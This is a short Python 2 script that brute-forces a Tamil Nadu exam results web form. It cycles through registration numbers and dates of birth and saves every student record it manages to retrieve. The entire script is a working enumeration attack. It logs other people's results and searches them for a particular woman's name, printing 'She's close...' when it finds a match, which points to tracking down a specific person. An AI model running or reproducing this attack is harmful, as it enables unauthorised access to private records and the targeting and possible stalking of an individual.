import urllib, urllib2
from datetime import date
import sys
from time import time

user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
headers = { 'User-Agent' : user_agent , 'Referer': 'http://tnresults.nic.in/gdslplus/gdslform.htm', 'Origin': 'http://tnresults.nic.in', 'Host': 'tnresults.nic.in'}

url = "http://tnresults.nic.in/gdslplus/gdslres.asp"

errorString = "Please check your Registration Number, Date of Birth"
nameString = "chandini"
reducer = 0
rollStart = int(sys.argv[1]) or 0
dateStart = int(sys.argv[2]) or 0

def getter(x, y):
  d = date.fromordinal(729025 - reducer + x)
  dob = d.strftime("%d/%m/%Y")
  values = {'regno': regno, 'dob': dob, 'B1': 'Get Marks'}
  starttime = time()


  data = urllib.urlencode(values)
  req = urllib2.Request(url, data, headers)
  response = urllib2.urlopen(req)
  page = response.read()

  timetaken = time() - starttime
  log = str(y)+"."+str(x)+" roll: "+regno+" date: "+str(dob)+" "+("%.2f" % timetaken)+"s"
  print log
  f = open('logs/dump.log', 'a')
  f.write(log+"\n")
  ret = 0
  if not errorString in page:
    ret = 1
    print "Found someone...\n"
    g = open('logs/all.log', 'a')
    g.write(page)
    if nameString in page.lower():
      print "She's close...\n"
      h = open('logs/pretty.log', 'a')
      h.write(page)
  return ret

# x=0
# getter(0)

starttimeW = time()
for y in range(rollStart, 9000000):
  regno = str(1000000 + y)
  starttimeR = time()
  start = 0
  if y == rollStart:
    start = dateStart
  for x in range(start, 820):
    success = getter(x, y)
    if success == 1:
      break
  timetakenR = time() - starttimeR
  f = open('logs/time.log', 'a')
  f.write("time for Roll: "+regno+" - "+("%.2f" % timetakenR)+"s\n")

timetakenW = time() - starttimeW
g = open('logs/time.log', 'a')
g.write("TOTAL TIME: "+("%.2f" % timetakenW)+"s\n")
